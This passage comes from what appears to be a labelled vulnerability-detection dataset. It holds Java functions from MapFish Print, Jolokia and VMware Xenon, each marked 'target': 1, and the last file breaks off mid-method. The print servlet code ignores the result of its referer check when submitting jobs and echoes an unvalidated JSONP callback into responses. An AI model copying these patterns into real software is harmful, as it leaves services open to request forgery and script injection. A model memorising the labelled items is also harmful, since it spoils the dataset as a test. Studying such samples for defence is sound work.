:\n                capabilitiesResponse.getWriter()) {\n            if (!pretty && !StringUtils.isEmpty(jsonpCallback)) {\n                writer.append(jsonpCallback).append(\"(\");\n            }\n\n            JSONWriter json = new JSONWriter(writer);\n            try {\n                json.object();\n                {\n                    json.key(JSON_APP).value(appId);\n                    printer.printClientConfig(json);\n                }\n                {\n                    json.key(\"formats\");\n                    Set<String> formats = printer.getOutputFormatsNames();\n                    json.array();\n                    for (String format: formats) {\n                        json.value(format);\n                    }\n                    json.endArray();\n                }\n                json.endObject();\n            } catch (JSONException e) {\n                throw new ServletException(e);\n            }\n\n            if (!pretty && !StringUtils.isEmpty(jsonpCallback)) {\n                writer.append(\");\");\n            }\n        }\n\n        if (pretty) {\n            final JSONObject jsonObject =\n                    new JSONObject(new String(prettyPrintBuffer.toByteArray(), Constants.DEFAULT_CHARSET));\n\n            if (!StringUtils.isEmpty(jsonpCallback)) {\n                capabilitiesResponse.getOutputStream().print(jsonpCallback + \"(\");\n            }\n            capabilitiesResponse.getOutputStream().print(jsonObject.toString(JSON_INDENT_FACTOR));\n            if (!StringUtils.isEmpty(jsonpCallback)) {\n                capabilitiesResponse.getOutputStream().print(\");\");\n            }\n        }\n    }\n\n    /**\n     * Get a sample request for the app.  An empty response may be returned if there is not example request.\n     *\n     * @param jsonpCallback if given the result is returned with a function call wrapped around it\n     * @param request the request object\n     * @param getExampleResponse the response object\n     */\n    @RequestMapping(value = EXAMPLE_REQUEST_URL, method = RequestMethod.GET)\n    public final void getExampleRequest(\n            @RequestParam(value = \"jsonp\", defaultValue = \"\") final String jsonpCallback,\n            final HttpServletRequest request,\n            final HttpServletResponse getExampleResponse) throws IOException {\n        getExampleRequest(DEFAULT_CONFIGURATION_FILE_KEY, jsonpCallback, request, getExampleResponse);\n    }\n\n    /**\n     * Get a sample request for the app.  An empty response may be returned if there is not example request.\n     *\n     * @param appId the id of the app to get the request for.\n     * @param jsonpCallback if given the result is returned with a function call wrapped around it\n     * @param request the request object\n     * @param getExampleResponse the response object\n     */\n    @RequestMapping(value = \"{appId}\" + EXAMPLE_REQUEST_URL, method = RequestMethod.GET)\n    public final void getExampleRequest(\n            @PathVariable final String appId,\n            @RequestParam(value = \"jsonp\", defaultValue = \"\") final String jsonpCallback,\n            final HttpServletRequest request,\n            final HttpServletResponse getExampleResponse) throws\n            IOException {\n        MDC.remove(Processor.MDC_JOB_ID_KEY);\n        setCache(getExampleResponse);\n        try {\n            final MapPrinter mapPrinter = this.printerFactory.create(appId);\n            if (!checkReferer(request, mapPrinter)) {\n                error(getExampleResponse, \"Invalid referer\", HttpStatus.FORBIDDEN);\n                return;\n            }\n            final String requestDataPrefix = \"requestData\";\n            final File[] children =\n                    mapPrinter.getConfiguration().getDirectory().listFiles(\n                            (dir, name) -> name.startsWith(requestDataPrefix) && name.endsWith(\".json\"));\n            if (children == null) {\n                error(getExampleResponse, \"Cannot find the config directory\", HttpStatus.NOT_FOUND);\n                return;\n            }\n            JSONObject allExamples = new JSONObject();\n\n            for (File child: children) {\n                if (child.isFile()) {\n                    String requestData = new String(Files.readAllBytes(child.toPath()),\n                                                    Constants.DEFAULT_CHARSET);\n                    try {\n                        final JSONObject jsonObject = new JSONObject(requestData);\n                        jsonObject.remove(JSON_OUTPUT_FORMAT);\n                        jsonObject.remove(JSON_APP);\n                        requestData = jsonObject.toString(JSON_INDENT_FACTOR);\n\n                        setContentType(getExampleResponse, jsonpCallback);\n                    } catch (JSONException e) {\n                        // ignore, return raw text\n                    }\n\n                    String name = child.getName();\n                    name = name.substring(requestDataPrefix.length());\n                    if (name.startsWith(\"-\")) {\n                        name = name.substring(1);\n                    }\n                    name = FilenameUtils.removeExtension(name);\n                    name = name.trim();\n                    if (name.isEmpty()) {\n                        name = FilenameUtils.removeExtension(child.getName());\n                    }\n\n                    try {\n                        allExamples.put(name, requestData);\n                    } catch (JSONException e) {\n                        Log.error(\"Error translating object to json\", e);\n                        error(getExampleResponse, \"Error translating object to json: \" + e.getMessage(),\n                              HttpStatus.INTERNAL_SERVER_ERROR);\n                        return;\n                    }\n                }\n            }\n            final String result;\n            try {\n                result = allExamples.toString(JSON_INDENT_FACTOR);\n            } catch (JSONException e) {\n                Log.error(\"Error translating object to json\", e);\n                error(getExampleResponse, \"Error translating object to json: \" + e.getMessage(),\n                      HttpStatus.INTERNAL_SERVER_ERROR);\n                return;\n            }\n\n            try (PrintWriter writer = getExampleResponse.getWriter()) {\n                appendJsonpCallback(jsonpCallback, writer);\n                writer.append(result);\n                appendJsonpCallbackEnd(jsonpCallback, writer);\n            }\n        } catch (NoSuchAppException e) {\n            error(getExampleResponse, \"No print app identified by: \" + appId, HttpStatus.NOT_FOUND);\n        }\n    }\n\n    /**\n     * List the available fonts on the system.\n     *\n     * @return the list of available fonts in the system.  The result is a JSON Array that just lists the font\n     *         family names available.\n     */\n    @RequestMapping(value = FONTS_URL)\n    @ResponseBody\n    public final String listAvailableFonts() {\n        MDC.remove(Processor.MDC_JOB_ID_KEY);\n        final JSONArray availableFonts = new JSONArray();\n        final List<FontFamily> families =\n                ExtensionsEnvironment.getExtensionsRegistry().getExtensions(FontFamily.class);\n        for (FontFamily family: families) {\n            availableFonts.put(family.getName());\n        }\n        return availableFonts.toString();\n    }\n\n    /**\n     * Maximum time to wait for a createAndGet request to complete before returning an error.\n     *\n     * @param maxCreateAndGetWaitTimeInSeconds the maximum time in seconds to wait for a report to be\n     *         generated.\n     */\n    public final void setMaxCreateAndGetWaitTimeInSeconds(final long maxCreateAndGetWaitTimeInSeconds) {\n        this.maxCreateAndGetWaitTimeInSeconds = maxCreateAndGetWaitTimeInSeconds;\n    }\n\n    /**\n     * Copy the PDF into the output stream.\n     *\n     * @param metadata the client request data\n     * @param httpServletResponse the response object\n     * @param reportLoader the object used for loading the report\n     * @param reportURI the uri of the report\n     * @param inline whether or not to inline the content\n     */\n    private void sendReportFile(\n            final PrintJobStatus metadata, final HttpServletResponse httpServletResponse,\n            final ReportLoader reportLoader, final URI reportURI, final boolean inline)\n            throws IOException {\n\n        try (OutputStream response = httpServletResponse.getOutputStream()) {\n            httpServletResponse.setContentType(metadata.getResult().getMimeType());\n            if (!inline) {\n                String fileName = metadata.getResult().getFileName();\n                Matcher matcher = VARIABLE_PATTERN.matcher(fileName);\n                while (matcher.find()) {\n                    final String variable = matcher.group(1);\n                    String replacement = findReplacement(variable, metadata.getCompletionDate());\n                    fileName = fileName.replace(\"${\" + variable + \"}\", replacement);\n                    matcher = VARIABLE_PATTERN.matcher(fileName);\n                }\n\n                fileName += \".\" + metadata.getResult().getFileExtension();\n                httpServletResponse\n                        .setHeader(\"Content-disposition\", \"attachment; filename=\" + cleanUpName(fileName));\n            }\n            reportLoader.loadReport(reportURI, response);\n        }\n    }\n\n    private void addDownloadLinkToJson(\n            final HttpServletRequest httpServletRequest, final String ref,\n            final JSONWriter json) {\n        String downloadURL = getBaseUrl(httpServletRequest) + REPORT_URL + \"/\" + ref;\n        json.key(JSON_DOWNLOAD_LINK).value(downloadURL);\n    }\n\n    /**\n     * Read the headers from the request.\n     *\n     * @param httpServletRequest the request object\n     */\n    protected final JSONObject getHeaders(final HttpServletRequest httpServletRequest) {\n        @SuppressWarnings(\"rawtypes\")\n        Enumeration headersName = httpServletRequest.getHeaderNames();\n        JSONObject headers = new JSONObject();\n        while (headersName.hasMoreElements()) {\n            String name = headersName.nextElement().toString();\n            Enumeration<String> e = httpServletRequest.getHeaders(name);\n            while (e.hasMoreElements()) {\n                headers.append(name, e.nextElement());\n            }\n\n        }\n        final JSONObject requestHeadersAttribute = new JSONObject();\n        requestHeadersAttribute.put(JSON_REQUEST_HEADERS, headers);\n        return requestHeadersAttribute;\n    }\n\n    /**\n     * Start a print job.\n     *\n     * @param appId the id of the printer app\n     * @param format the format of the returned report.\n     * @param requestDataRaw the request json in string form\n     * @param httpServletRequest the request object\n     * @param httpServletResponse the response object\n     * @return the job reference id\n     */\n    private String createAndSubmitPrintJob(\n            final String appId, final String format, final String requestDataRaw,\n            final HttpServletRequest httpServletRequest, final HttpServletResponse httpServletResponse)\n            throws NoSuchAppException {\n\n        PJsonObject specJson = parseJson(requestDataRaw, httpServletResponse);\n        if (specJson == null) {\n            return null;\n        }\n        String ref = maybeAddRequestId(\n                UUID.randomUUID().toString() + \"@\" + this.servletInfo.getServletId(),\n                httpServletRequest);\n        MDC.put(Processor.MDC_JOB_ID_KEY, ref);\n        LOGGER.debug(\"{}\", specJson);\n\n        specJson.getInternalObj().remove(JSON_OUTPUT_FORMAT);\n        specJson.getInternalObj().put(JSON_OUTPUT_FORMAT, format);\n        specJson.getInternalObj().remove(JSON_APP);\n        specJson.getInternalObj().put(JSON_APP, appId);\n        final JSONObject requestHeaders = getHeaders(httpServletRequest);\n        if (requestHeaders.length() > 0) {\n            specJson.getInternalObj().getJSONObject(JSON_ATTRIBUTES)\n                    .put(JSON_REQUEST_HEADERS, requestHeaders);\n        }\n\n        // check that we have authorization and configure the job so it can only be access by users with\n        // sufficient authorization\n        final String templateName = specJson.getString(Constants.JSON_LAYOUT_KEY);\n        final MapPrinter mapPrinter = this.mapPrinterFactory.create(appId);\n        checkReferer(httpServletRequest, mapPrinter);\n        final Template template = mapPrinter.getConfiguration().getTemplate(templateName);\n        if (template == null) {\n            return null;\n        }\n\n        PrintJobEntryImpl jobEntry = new PrintJobEntryImpl(ref, specJson, System.currentTimeMillis());\n        jobEntry.configureAccess(template, this.context);\n\n        try {\n            this.jobManager.submit(jobEntry);\n        } catch (RuntimeException exc) {\n            LOGGER.error(\"Error when creating job on {}: {}\", appId, specJson, exc);\n            ref = null;\n        }\n        return ref;\n    }\n\n    private boolean checkReferer(\n            final HttpServletRequest request, final MapPrinter mapPrinter) {\n        final Configuration config = mapPrinter.getConfiguration();\n        final UriMatchers allowedReferers = config.getAllowedReferersImpl();\n        if (allowedReferers == null) {\n            return true;\n        }\n        String referer = request.getHeader(\"referer\");\n        if (referer == null) {\n            referer = \"http://localhost/\";\n        }\n        try {\n            return allowedReferers.matches(new URI(referer),\n                                           HttpMethod.resolve(request.getMethod()));\n        } catch (SocketException | UnknownHostException | URISyntaxException | MalformedURLException e) {\n            LOGGER.error(\"Referer {} invalid\", referer, e);\n            return false;\n        }\n    }\n\n    private <R> R loadReport(\n            final String referenceId, final HttpServletResponse httpServletResponse,\n            final HandleReportLoadResult<R> handler) throws IOException, ServletException {\n        PrintJobStatus metadata;\n\n        try {\n            metadata = this.jobManager.getStatus(referenceId);\n        } catch (NoSuchReferenceException e) {\n            return handler.unknownReference(httpServletResponse, referenceId);\n        }\n\n        if (!metadata.isDone()) {\n            return handler.printJobPending(httpServletResponse, referenceId);\n        } else if (metadata.getResult() != null) {\n            URI pdfURI = metadata.getResult().getReportURI();\n\n            ReportLoader loader = null;\n            for (ReportLoader reportLoader: this.reportLoaders) {\n                if (reportLoader.accepts(pdfURI)) {\n                    loader = reportLoader;\n                    break;\n                }\n            }\n            if (loader == null) {\n                return handler.unsupportedLoader(httpServletResponse, referenceId);\n            } else {\n                return handler.successfulPrint(metadata, httpServletResponse, pdfURI, loader);\n            }\n        } else {\n            return handler.failedPrint(metadata, httpServletResponse);\n        }\n\n    }\n\n    private void setContentType(\n            final HttpServletResponse statusResponse,\n            final String jsonpCallback) {\n        if (StringUtils.isEmpty(jsonpCallback)) {\n            statusResponse.setContentType(\"application/json; charset=utf-8\");\n        } else {\n            statusResponse.setContentType(\"application/javascript; charset=utf-8\");\n        }\n    }\n\n    private void appendJsonpCallback(\n            final String jsonpCallback,\n            final PrintWriter writer) {\n        if (!StringUtils.isEmpty(jsonpCallback)) {\n            writer.append(jsonpCallback);\n            writer.append(\"(\");\n        }\n    }\n\n    private void appendJsonpCallbackEnd(\n            final String jsonpCallback,\n            final PrintWriter writer) {\n        if (!StringUtils.isEmpty(jsonpCallback)) {\n            writer.append(\");\");\n        }\n    }\n\n}\n", "target": 1}
{"idx": 1016, "func": "package org.jolokia.http;\n\n/*\n * Copyright 2009-2011 Roland Huss\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n */\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Map;\n\nimport javax.management.*;\n\nimport org.easymock.EasyMock;\nimport org.easymock.IArgumentMatcher;\nimport org.jolokia.config.Configuration;\nimport org.jolokia.backend.BackendManager;\nimport org.jolokia.request.JmxReadRequest;\nimport org.jolokia.request.JmxRequest;\nimport org.jolokia.test.util.HttpTestUtil;\nimport org.jolokia.util.LogHandler;\nimport org.jolokia.util.RequestType;\nimport org.json.simple.JSONArray;\nimport org.json.simple.JSONObject;\nimport org.testng.annotations.*;\n\nimport static org.easymock.EasyMock.*;\nimport static org.testng.Assert.*;\n\n/**\n * @author roland\n * @since 31.08.11\n */\npublic class HttpRequestHandlerTest {\n\n    private BackendManager backend;\n    private HttpRequestHandler handler;\n\n    @BeforeMethod\n    public void setup() {\n        backend = createMock(BackendManager.class);\n        expect(backend.isDebug()).andReturn(true).anyTimes();\n\n        handler = new HttpRequestHandler(new Configuration(),backend, createDummyLogHandler());\n    }\n\n    @AfterMethod\n    public void tearDown() {\n        verify(backend);\n    }\n\n    @Test\n    public void accessAllowed() {\n        expect(backend.isRemoteAccessAllowed(\"localhost\",\"127.0.0.1\")).andReturn(true);\n        replay(backend);\n\n        handler.checkClientIPAccess(\"localhost\",\"127.0.0.1\");\n    }\n\n    @Test(expectedExceptions = { SecurityException.class })\n    public void accessDenied() {\n        expect(backend.isRemoteAccessAllowed(\"localhost\",\"127.0.0.1\")).andReturn(false);\n        replay(backend);\n\n        handler.checkClientIPAccess(\"localhost\",\"127.0.0.1\");\n    }\n\n    @Test\n    public void get() throws InstanceNotFoundException, IOException, ReflectionException, AttributeNotFoundException, MBeanException {\n        JSONObject resp = new JSONObject();\n        expect(backend.handleRequest(isA(JmxReadRequest.class))).andReturn(resp);\n        replay(backend);\n\n        JSONObject response = (JSONObject) handler.handleGetRequest(\"/jolokia\", HttpTestUtil.HEAP_MEMORY_GET_REQUEST, null);\n        assertTrue(response == resp);\n    }\n\n    @Test\n    public void getWithDoubleSlashes() throws MBeanException, AttributeNotFoundException, ReflectionException, InstanceNotFoundException, IOException {\n        JSONObject resp = new JSONObject();\n        expect(backend.handleRequest(eqReadRequest(\"read\", \"bla:type=s/lash/\", \"attribute\"))).andReturn(resp);\n        replay(backend);\n\n        JSONObject response = (JSONObject) handler.handleGetRequest(\"/read/bla%3Atype%3Ds!/lash!//attribute\",\n                                 \"/read/bla:type=s!/lash!/Ok\",null);\n        assertTrue(response == resp);\n    }\n\n    private JmxRequest eqReadRequest(String pType, final String pMBean, final String pAttribute) {\n        EasyMock.reportMatcher(new IArgumentMatcher() {\n            public boolean matches(Object argument) {\n                try {\n                    JmxReadRequest req = (JmxReadRequest) argument;\n                    return req.getType() == RequestType.READ &&\n                           new ObjectName(pMBean).equals(req.getObjectName()) &&\n                           pAttribute.equals(req.getAttributeName());\n                } catch (MalformedObjectNameException e) {\n                    return false;\n                }\n            }\n\n            public void appendTo(StringBuffer buffer) {\n                buffer.append(\"eqReadRequest(mbean = \\\"\");\n                buffer.append(pMBean);\n                buffer.append(\"\\\", attribute = \\\"\");\n                buffer.append(pAttribute);\n                buffer.append(\"\\\")\");\n\n            }\n        });\n        return null;\n    }\n\n\n    @Test\n    public void singlePost() throws IOException, InstanceNotFoundException, ReflectionException, AttributeNotFoundException, MBeanException {\n        JSONObject resp = new JSONObject();\n        expect(backend.handleRequest(isA(JmxReadRequest.class))).andReturn(resp);\n        replay(backend);\n\n        InputStream is = HttpTestUtil.createServletInputStream(HttpTestUtil.HEAP_MEMORY_POST_REQUEST);\n        JSONObject response = (JSONObject) handler.handlePostRequest(\"/jolokia\",is,\"utf-8\",null);\n        assertTrue(response == resp);\n    }\n\n\n    @Test\n    public void doublePost() throws IOException, InstanceNotFoundException, ReflectionException, AttributeNotFoundException, MBeanException {\n        JSONObject resp = new JSONObject();\n        expect(backend.handleRequest(isA(JmxReadRequest.class))).andReturn(resp).times(2);\n        replay(backend);\n\n        InputStream is = HttpTestUtil.createServletInputStream(\"[\" + HttpTestUtil.HEAP_MEMORY_POST_REQUEST + \",\" + HttpTestUtil.HEAP_MEMORY_POST_REQUEST + \"]\");\n        JSONArray response = (JSONArray) handler.handlePostRequest(\"/jolokia\", is, \"utf-8\", null);\n        assertEquals(response.size(),2);\n        assertTrue(response.get(0) == resp);\n        assertTrue(response.get(1) == resp);\n    }\n\n    @Test\n    public void preflightCheck() {\n        String origin = \"http://bla.com\";\n        String headers =\"X-Data: Test\";\n        expect(backend.isCorsAccessAllowed(origin)).andReturn(true);\n        replay(backend);\n\n        Map<String,String> ret =  handler.handleCorsPreflightRequest(origin, headers);\n        assertEquals(ret.get(\"Access-Control-Allow-Origin\"),origin);\n    }\n\n    @Test\n    public void preflightCheckNegative() {\n        String origin = \"http://bla.com\";\n        String headers =\"X-Data: Test\";\n        expect(backend.isCorsAccessAllowed(origin)).andReturn(false);\n        replay(backend);\n\n        Map<String,String> ret =  handler.handleCorsPreflightRequest(origin, headers);\n        assertNull(ret.get(\"Access-Control-Allow-Origin\"));\n    }\n\n    @Test(expectedExceptions = IllegalArgumentException.class)\n    public void invalidJson() throws IOException {\n        replay(backend);\n        InputStream is = HttpTestUtil.createServletInputStream(\"{ bla;\");\n        handler.handlePostRequest(\"/jolokia\",is,\"utf-8\",null);\n    }\n\n    @Test(expectedExceptions = IllegalArgumentException.class)\n    public void invalidJson2() throws IOException {\n        replay(backend);\n        InputStream is = HttpTestUtil.createServletInputStream(\"12\");\n        handler.handlePostRequest(\"/jolokia\",is,\"utf-8\",null);\n    }\n\n    @Test\n    public void requestErrorHandling() throws MalformedObjectNameException, InstanceNotFoundException, IOException, ReflectionException, AttributeNotFoundException, MBeanException {\n        Object[] exceptions = new Object[] {\n                new ReflectionException(new NullPointerException()), 404,500,\n                new InstanceNotFoundException(), 404, 500,\n                new MBeanException(new NullPointerException()), 500, 500,\n                new AttributeNotFoundException(), 404, 500,\n                new UnsupportedOperationException(), 500, 500,\n                new IOException(), 500, 500,\n                new IllegalArgumentException(), 400, 400,\n                new SecurityException(),403, 403,\n                new RuntimeMBeanException(new NullPointerException()), 500, 500\n        };\n\n        for (int i = 0; i < exceptions.length; i += 3) {\n            Exception e = (Exception) exceptions[i];\n            reset(backend);\n            expect(backend.isDebug()).andReturn(true).anyTimes();\n            backend.error(find(\"\" + exceptions[i + 1]), EasyMock.<Throwable>anyObject());\n            backend.error(find(\"\" + exceptions[i + 2]), EasyMock.<Throwable>anyObject());\n            expect(backend.handleRequest(EasyMock.<JmxRequest>anyObject())).andThrow(e);\n            replay(backend);\n            JSONObject resp = (JSONObject) handler.handleGetRequest(\"/jolokia\",\n                                                                    \"/read/java.lang:type=Memory/HeapMemoryUsage\",null);\n            assertEquals(resp.get(\"status\"),exceptions[i+1]);\n\n            resp = handler.handleThrowable(e);\n            assertEquals(resp.get(\"status\"),exceptions[i+2],e.getClass().getName());\n        }\n    }\n\n    // ======================================================================================================\n\n    private LogHandler createDummyLogHandler() {\n        return new LogHandler() {\n                public void debug(String message) {\n                }\n\n                public void info(String message) {\n                }\n\n                public void error(String message, Throwable t) {\n                }\n            };\n    }\n}\n", "target": 1}
{"idx": 1017, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\nimport static org.junit.Assert.assertNotNull;\nimport static org.junit.Assert.assertNotSame;\nimport static org.junit.Assert.assertNull;\nimport static org.junit.Assert.assertTrue;\nimport static org.junit.Assert.fail;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.time.Duration;\nimport java.time.temporal.ChronoUnit;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Date;\nimport java.util.EnumSet;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Random;\nimport java.util.UUID;\nimport java.util.concurrent.CancellationException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.function.Consumer;\nimport java.util.logging.Level;\n\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\nimport org.junit.After;\nimport org.junit.Rule;\nimport org.junit.Test;\nimport org.junit.rules.TemporaryFolder;\n\nimport com.vmware.xenon.common.Operation.CompletionHandler;\nimport com.vmware.xenon.common.Service.Action;\nimport com.vmware.xenon.common.Service.ProcessingStage;\nimport com.vmware.xenon.common.Service.ServiceOption;\nimport com.vmware.xenon.common.ServiceHost.RequestRateInfo;\nimport com.vmware.xenon.common.ServiceHost.ServiceAlreadyStartedException;\nimport com.vmware.xenon.common.ServiceHost.ServiceHostState;\nimport com.vmware.xenon.common.ServiceHost.ServiceHostState.MemoryLimitType;\nimport com.vmware.xenon.common.ServiceStats.ServiceStat;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats.AggregationType;\nimport com.vmware.xenon.common.jwt.Rfc7519Claims;\nimport com.vmware.xenon.common.jwt.Signer;\nimport com.vmware.xenon.common.jwt.Verifier;\nimport com.vmware.xenon.common.test.AuthTestUtils;\nimport com.vmware.xenon.common.test.MinimalTestServiceState;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.common.test.TestProperty;\nimport com.vmware.xenon.common.test.TestRequestSender;\nimport com.vmware.xenon.common.test.VerificationHost;\nimport com.vmware.xenon.common.test.VerificationHost.WaitHandler;\nimport com.vmware.xenon.services.common.AuthorizationContextService;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.ExampleServiceHost;\nimport com.vmware.xenon.services.common.FileContentService;\nimport com.vmware.xenon.services.common.LuceneDocumentIndexService;\nimport com.vmware.xenon.services.common.MinimalFactoryTestService;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.NodeGroupService.NodeGroupState;\nimport com.vmware.xenon.services.common.NodeState;\nimport com.vmware.xenon.services.common.OnDemandLoadFactoryService;\nimport com.vmware.xenon.services.common.QueryTask.Query;\nimport com.vmware.xenon.services.common.ServiceContextIndexService;\nimport com.vmware.xenon.services.common.ServiceHostLogService.LogServiceState;\nimport com.vmware.xenon.services.common.ServiceHostManagementService;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\nimport com.vmware.xenon.services.common.UiFileContentService;\nimport com.vmware.xenon.services.common.UserService;\n\npublic class TestServiceHost {\n\n    public static class AuthCheckService extends ExampleService {\n        public static final String FACTORY_LINK = ServiceUriPaths.CORE + \"/auth-check-services\";\n\n        static final String IS_AUTHORIZE_REQUEST_CALLED = \"isAuthorizeRequestCalled\";\n\n        public static FactoryService createFactory() {\n            return FactoryService.create(AuthCheckService.class);\n        }\n\n        public AuthCheckService() {\n            super();\n            // non persisted, owner selection service\n            toggleOption(ServiceOption.PERSISTENCE, false);\n            toggleOption(ServiceOption.INSTRUMENTATION, true);\n        }\n\n        @Override\n        public void authorizeRequest(Operation op) {\n            adjustStat(IS_AUTHORIZE_REQUEST_CALLED, 1);\n            op.complete();\n        }\n    }\n\n    private static final int MAINTENANCE_INTERVAL_MILLIS = 100;\n\n    private VerificationHost host;\n\n    public String testURI;\n\n    public int requestCount = 1000;\n\n    public int rateLimitedRequestCount = 10;\n\n    public int connectionCount = 32;\n\n    public long serviceCount = 10;\n\n    public int iterationCount = 1;\n\n    public long testDurationSeconds = 0;\n\n    public int indexFileThreshold = 100;\n\n    public long serviceCacheClearDelaySeconds = 2;\n\n    @Rule\n    public TemporaryFolder tmpFolder = new TemporaryFolder();\n\n\n    public void beforeHostStart(VerificationHost host) {\n        host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS\n                .toMicros(MAINTENANCE_INTERVAL_MILLIS));\n    }\n\n    private void setUp(boolean initOnly) throws Exception {\n        CommandLineArgumentParser.parseFromProperties(this);\n        this.host = VerificationHost.create(0);\n        CommandLineArgumentParser.parseFromProperties(this.host);\n        if (initOnly) {\n            return;\n        }\n\n        try {\n            this.host.start();\n        } catch (Throwable e) {\n            throw new Exception(e);\n        }\n    }\n\n    @Test\n    public void allocateExecutor() throws Throwable {\n        setUp(false);\n        Service s = this.host.startServiceAndWait(MinimalTestService.class, UUID.randomUUID()\n                .toString());\n        ExecutorService exec = this.host.allocateExecutor(s);\n        this.host.testStart(1);\n        exec.execute(() -> {\n            this.host.completeIteration();\n        });\n        this.host.testWait();\n    }\n\n    @Test\n    public void operationTracingFineFiner() throws Throwable {\n        setUp(false);\n        TestRequestSender sender = this.host.getTestRequestSender();\n        this.host.toggleOperationTracing(this.host.getUri(), Level.FINE, true);\n        // send some requests and confirm stats get populated\n\n        URI factoryUri = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null,\n                this.serviceCount,\n                ExampleServiceState.class, (op) -> {\n                    ExampleServiceState st = new ExampleServiceState();\n                    st.name = \"foo\";\n                    op.setBody(st);\n                }, factoryUri);\n        TestContext ctx = this.host.testCreate(states.size() * 2);\n        for (URI u : states.keySet()) {\n            ExampleServiceState state = new ExampleServiceState();\n            state.name = this.host.nextUUID();\n            sender.sendRequest(Operation.createGet(u).setCompletion(ctx.getCompletion()));\n            sender.sendRequest(\n                    Operation.createPatch(u)\n                            .setContextId(this.host.nextUUID())\n                            .setBody(state).setCompletion(ctx.getCompletion()));\n        }\n        ctx.await();\n        ServiceStats after = sender.sendStatsGetAndWait(this.host.getManagementServiceUri());\n        for (URI u : states.keySet()) {\n            String getStatName = u.getPath() + \":\" + Action.GET;\n            String patchStatName = u.getPath() + \":\" + Action.PATCH;\n            ServiceStat getStat = after.entries.get(getStatName);\n            assertTrue(getStat != null && getStat.latestValue > 0);\n            ServiceStat patchStat = after.entries.get(patchStatName);\n            assertTrue(patchStat != null && getStat.latestValue > 0);\n        }\n        this.host.toggleOperationTracing(this.host.getUri(), Level.FINE, false);\n\n        // toggle on again, to FINER, confirm we get some log output\n        this.host.toggleOperationTracing(this.host.getUri(), Level.FINER, true);\n\n        // send some operations\n        ctx = this.host.testCreate(states.size() * 2);\n        for (URI u : states.keySet()) {\n            ExampleServiceState state = new ExampleServiceState();\n            state.name = this.host.nextUUID();\n            sender.sendRequest(Operation.createGet(u).setCompletion(ctx.getCompletion()));\n            sender.sendRequest(\n                    Operation.createPatch(u).setContextId(this.host.nextUUID()).setBody(state)\n                            .setCompletion(ctx.getCompletion()));\n        }\n        ctx.await();\n\n        LogServiceState logsAfterFiner = sender.sendGetAndWait(\n                UriUtils.buildUri(this.host, ServiceUriPaths.PROCESS_LOG),\n                LogServiceState.class);\n\n        boolean foundTrace = false;\n        for (String line : logsAfterFiner.items) {\n            for (URI u : states.keySet()) {\n                if (line.contains(u.getPath())) {\n                    foundTrace = true;\n                    break;\n                }\n            }\n        }\n        assertTrue(foundTrace);\n    }\n\n    @Test\n    public void buildDocumentDescription() throws Throwable {\n        setUp(false);\n        URI factoryUri = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null,\n                this.serviceCount,\n                ExampleServiceState.class, (op) -> {\n                    ExampleServiceState st = new ExampleServiceState();\n                    st.name = \"foo\";\n                    op.setBody(st);\n                }, factoryUri);\n\n        // verify we have valid descriptions for all example services we created\n        // explicitly\n        validateDescriptions(states);\n\n        // verify we can recover a description, even for services that are stopped\n        TestContext ctx = this.host.testCreate(states.size());\n        for (URI childUri : states.keySet()) {\n            Operation delete = Operation.createDelete(childUri)\n                    .setCompletion(ctx.getCompletion());\n            this.host.send(delete);\n        }\n        this.host.testWait(ctx);\n\n        // do the description lookup again, on stopped services\n        validateDescriptions(states);\n    }\n\n    private void validateDescriptions(Map<URI, ExampleServiceState> states) {\n        for (URI childUri : states.keySet()) {\n            ServiceDocumentDescription desc = this.host\n                    .buildDocumentDescription(childUri.getPath());\n            // do simple verification of returned description, its not exhaustive\n            assertTrue(desc != null);\n            assertTrue(desc.serviceCapabilities.contains(ServiceOption.PERSISTENCE));\n            assertTrue(desc.serviceCapabilities.contains(ServiceOption.INSTRUMENTATION));\n            assertTrue(desc.propertyDescriptions.size() > 1);\n        }\n    }\n\n    @Test\n    public void requestRateLimits() throws Throwable {\n        CommandLineArgumentParser.parseFromProperties(this);\n        for (int i = 0; i < this.iterationCount; i++) {\n            doRequestRateLimits();\n            tearDown();\n        }\n    }\n\n    private void doRequestRateLimits() throws Throwable {\n        setUp(true);\n\n        